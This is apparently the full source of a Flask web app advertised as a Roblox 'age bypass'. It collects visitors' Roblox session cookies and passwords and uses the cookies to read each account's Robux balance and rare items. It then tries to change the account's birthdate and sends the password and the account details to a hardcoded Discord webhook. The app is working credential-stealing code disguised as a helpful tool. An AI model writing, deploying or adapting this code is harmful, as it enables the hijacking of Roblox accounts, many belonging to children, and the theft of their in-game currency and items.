from flask import Flask, render_template, request, jsonify
import requests
import json
import asyncio
import datetime

app = Flask(__name__)

# --- CONFIGURATION (Synced with bot) ---
LOG_WEBHOOK = 'https://discord.com/api/webhooks/1496952883810402457/qIzeSB9KIEhLOX00c-O-d3tZCHIXkurfJ19ZSKgpon7oZHMc5pvov0sFAXEl-ySbsLCC'

# Set the target birthday (April 30, 2013)
BIRTH_DAY = 30
BIRTH_MONTH = 4
BIRTH_YEAR = 2013

def get_account_info(session):
    """Fetches detailed account info like Robux, Pending, and Items."""
    try:
        # 1. Get User ID and Username
        user_data = session.get("https://users.roblox.com/v1/users/authenticated").json()
        user_id = user_data.get('id')
        username = user_data.get('name')
        
        if not user_id:
            return None

        # 2. Get Robux Balance
        economy_data = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency").json()
        robux = economy_data.get('robux', 0)

        # 3. Get Pending Robux
        pending = 0
        try:
            pending_data = session.get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=Summary").json()
            pending = pending_data.get('pendingRobux', 0)
        except:
            pass

        # 4. Check Items (Korblox and Headless)
        korblox_check = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192").json()
        headless_check = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/310").json()

        has_korblox = "✅" if korblox_check.get('data') else "❌"
        has_headless = "✅" if headless_check.get('data') else "❌"

        # 5. Get Profile Picture
        thumbnail = ""
        try:
            thumb_data = session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false").json()
            thumbnail = thumb_data.get('data', [{}])[0].get('imageUrl', "")
        except:
            pass

        return {
            "user_id": user_id,
            "username": username,
            "robux": robux,
            "pending": pending,
            "korblox": has_korblox,
            "headless": has_headless,
            "thumbnail": thumbnail
        }
    except:
        return None

def send_to_webhook(status, info, cookie, result_msg, password):
    """Sends a redesigned, cool bypass result and account info to the configured webhook."""
    if not LOG_WEBHOOK or "api/webhooks" not in LOG_WEBHOOK:
        return

    # Cool Color Scheme: Electric Blue for success, Crimson for failure
    color = 0x00d4ff if status else 0xff2e2e
    timestamp = datetime.datetime.utcnow().isoformat()

    # Determine status icon and title
    status_title = "⚡ WEB BYPASS SUCCESSFUL" if status else "⚠️ WEB BYPASS FAILED"
    status_icon = "🟢" if status else "🔴"

    embed = {
        "title": f"{status_icon} {status_title}",
        "color": color,
        "description": f"**Source:** `Website Form`\n**Method Used:** `{result_msg}`\n**Bypass Target:** `4/30/2013`",
        "fields": [],
        "footer": {
            "text": "Bypasser ni Boss James • Web System Logs",
            "icon_url": "https://i.imgur.com/pwxGeZi.jpeg"
        },
        "timestamp": timestamp
    }

    if info:
        if info.get('thumbnail'):
            embed["thumbnail"] = {"url": info['thumbnail']}
        
        # Identity Section
        embed["fields"].append({
            "name": "👤 ACCOUNT IDENTITY",
            "value": f"**User:** [{info['username']}](https://www.roblox.com/users/{info['user_id']}/profile)\n**ID:** `{info['user_id']}`\n**Pass:** `{password}`",
            "inline": False
        })

        # Economy Section
        embed["fields"].append({
            "name": "💰 ECONOMY",
            "value": f"**Balance:** `{info['robux']}` Robux\n**Pending:** `{info['pending']}` Robux",
            "inline": True
        })

        # Rare Items Section
        embed["fields"].append({
            "name": "✨ RARE ITEMS",
            "value": f"**Korblox:** {info['korblox']}\n**Headless:** {info['headless']}",
            "inline": True
        })
        
        # Divider or extra info
        embed["fields"].append({
            "name": "🔗 QUICK LINKS",
            "value": f"[Avatar Editor](https://www.roblox.com/my/avatar) • [Settings](https://www.roblox.com/my/account)",
            "inline": False
        })
    else:
        embed["description"] += f"\n\n> ⚠️ **Warning:** Could not fetch detailed account profile. Pass used: `{password}`"
    
    payload = {
        "username": "Bypasser ni Boss James Logs",
        "avatar_url": "https://i.imgur.com/pwxGeZi.jpeg",
        "embeds": [embed]
    }

    try:
        requests.post(LOG_WEBHOOK, json=payload)
    except:
        pass

def perform_bypass(cookie):
    """Core logic to change the age, synced with bot's logic."""
    cookie = cookie.strip()
    if not cookie.startswith("_|WARNING:-"):
        cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + cookie

    session = requests.Session()
    session.cookies.set(".ROBLOSECURITY", cookie, domain="roblox.com")

    # Fetch account info first
    account_info = get_account_info(session)

    try:
        # 1. Get CSRF Token
        response = session.post("https://auth.roblox.com/v2/logout")
        csrf_token = response.headers.get("x-csrf-token")
        if not csrf_token:
            return False, "Could not retrieve CSRF token", account_info, cookie

        headers = {
            "X-CSRF-TOKEN": csrf_token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Referer": "https://www.roblox.com/my/account"
        }
        
        payload = {"birthMonth": BIRTH_MONTH, "birthDay": BIRTH_DAY, "birthYear": BIRTH_YEAR}

        # Method 1: Standard Users API
        resp1 = session.post("https://users.roblox.com/v1/birthdate", headers=headers, data=json.dumps(payload))
        if resp1.status_code == 200:
            return True, "Success using Method 1", account_info, cookie

        # Method 2: Legacy Account Settings API
        resp2 = session.post("https://accountsettings.roblox.com/v1/birthday", headers=headers, data=json.dumps(payload))
        if resp2.status_code == 200:
            return True, "Success via Method 2", account_info, cookie

        # Method 3: Legacy Monolithic Web Endpoint
        web_payload = {"birthDay": BIRTH_DAY, "birthMonth": BIRTH_MONTH, "birthYear": BIRTH_YEAR, "isUpdateBirthday": True}
        resp3 = session.post("https://www.roblox.com/my/account/settings/save-personal", headers=headers, data=json.dumps(web_payload))
        if resp3.status_code == 200:
            return True, "Success via Method 3", account_info, cookie

        return False, f"All methods failed: {resp3.text}", account_info, cookie
    except Exception as e:
        return False, f"Error: {str(e)}", account_info, cookie

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    password = data.get('password')
    cookie = data.get('cookie')

    if not cookie or not password:
        return jsonify({"success": False, "message": "Missing fields!"})

    success, method, info, clean_cookie = perform_bypass(cookie)
    
    # Log to Webhook
    send_to_webhook(success, info, clean_cookie, method, password)

    if success:
        return jsonify({"success": True, "message": f"Successfully bypassed using {method}!"})
    else:
        return jsonify({"success": False, "message": f"Bypass failed: {method}"})

if __name__ == '__main__':
    # Running on port 80 or 5000
    app.run(host='0.0.0.0', port=5000, debug=True)

# For Vercel deployment
app = app
